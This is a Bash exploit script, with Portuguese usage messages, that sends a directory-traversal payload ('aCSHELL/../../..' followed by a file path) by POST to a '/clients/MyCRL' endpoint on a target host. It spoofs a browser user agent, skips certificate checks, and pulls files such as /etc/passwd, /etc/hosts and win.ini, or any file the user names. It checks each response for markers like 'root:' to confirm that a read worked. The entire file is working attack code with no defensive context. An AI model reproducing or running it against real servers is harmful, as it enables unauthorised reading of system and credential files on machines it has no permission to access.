#!/bin/bash

exec=$(echo $0 | rev | cut -d '/' -f1 | rev)
arquivos=("/etc/hosts" "/etc/passwd" "/boot.ini" "/windows/win.ini" "/windows/system32/drivers/etc/hosts")

condicoes=("root:" "nobody:" "127.0.0.1" "\[fonts\]" "Generated")

if [[ $# -eq 0 || $# -gt 2 ]]
then
	echo "Numero de parametros incorreto"
	echo "Forma de uso: "
	echo -e "\t $exec HOST"
	echo -e "\t $exec 127.0.0.1"
 	echo
	echo -e "\t $exec HOST ARQUIVO"
	echo -e "\t $exec 127.0.0.1 /etc/hosts"
	exit 1
fi

if [ $# -eq 1 ]
then
	for arquivo in "${arquivos[@]}"
	do
		host="https://$1"
		payload="aCSHELL/../../../../../../../../..$arquivo"
		tamanho=${#payload}
	
		resposta=$(curl -m 5 -H "Content-Length: $tamanho" -A "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -s -X POST -d "$payload" "$host/clients/MyCRL" -k)
	
		for condicao in "${condicoes[@]}"
		do
			if echo $resposta | grep -q "$condicao"
			then
				echo $arquivo
				printf "%s\n" "$resposta"
				echo
				break
			fi
		done
	done
elif [ $# -eq 2 ]
then
	host="https://$1"
	arquivo=$2
	payload="aCSHELL/../../../../../../../../..$arquivo"
	tamanho=${#payload}
	
	curl -m 5 -H "Content-Length: $tamanho" -A "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -s -X POST -d "$payload" "$host/clients/MyCRL" -k
fi
